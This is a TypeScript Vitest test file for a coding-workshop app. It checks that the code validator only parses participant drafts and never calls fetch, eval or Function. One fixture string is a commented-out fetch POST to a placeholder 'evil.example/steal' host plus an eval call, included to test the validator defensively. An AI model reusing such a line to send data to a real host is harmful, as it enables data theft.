import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { LANGUAGES } from "@/lib/workshop/types";
import { loadTask1Adapter } from "./task1Adapters";
import { loadTask2Adapter } from "./task2Adapters";
import { loadTask3Adapter } from "./task3Adapters";
import { loadTask4Adapter } from "./task4Adapters";

/**
 * Issue #8 / spec 9.1 and 16.8: participant code is validated purely by
 * inspecting its Lezer syntax tree — it must never be evaluated, and never
 * leave the browser. Covers all 16 task-language combinations, including a
 * document that contains fetch(...)/eval(...) as plain text (as if a
 * participant typed it into the editable region) to prove the validator
 * only ever *parses* that text rather than running it.
 */
const TASK_LOADERS = [
  { task: "request-dto", loadAdapter: loadTask1Adapter },
  { task: "request-mapper", loadAdapter: loadTask2Adapter },
  { task: "external-api", loadAdapter: loadTask3Adapter },
  { task: "response-dto", loadAdapter: loadTask4Adapter },
] as const;

const COMBINATIONS = TASK_LOADERS.flatMap(({ task, loadAdapter }) =>
  LANGUAGES.map((language) => ({ task, language, loadAdapter })),
);

describe("validate() never executes or transmits participant code", () => {
  let fetchSpy: ReturnType<typeof vi.fn>;
  let evalSpy: ReturnType<typeof vi.spyOn>;
  let functionSpy: ReturnType<typeof vi.spyOn>;

  beforeEach(() => {
    fetchSpy = vi.fn();
    vi.stubGlobal("fetch", fetchSpy);
    // eslint-disable-next-line @typescript-eslint/no-explicit-any -- spying on the global eval/Function themselves, not calling them
    evalSpy = vi.spyOn(globalThis as any, "eval");
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    functionSpy = vi.spyOn(globalThis as any, "Function");
  });

  afterEach(() => {
    evalSpy.mockRestore();
    functionSpy.mockRestore();
    vi.unstubAllGlobals();
  });

  it.each(COMBINATIONS)(
    "$task/$language: no fetch, eval, or Function call while validating a solved, a broken, and a malicious-looking draft",
    async ({ language, loadAdapter }) => {
      const adapter = await loadAdapter(language);

      const maliciousDoc = `${adapter.solutionCode}\n// fetch("https://evil.example/steal", { method: "POST" }); eval("alert(1)");`;

      adapter.validate(adapter.solutionCode);
      adapter.validate(adapter.starterCode.before + adapter.starterCode.after);
      adapter.validate(maliciousDoc);
      adapter.validate("{{{ not even parseable");

      expect(fetchSpy).not.toHaveBeenCalled();
      expect(evalSpy).not.toHaveBeenCalled();
      expect(functionSpy).not.toHaveBeenCalled();
    },
  );
});
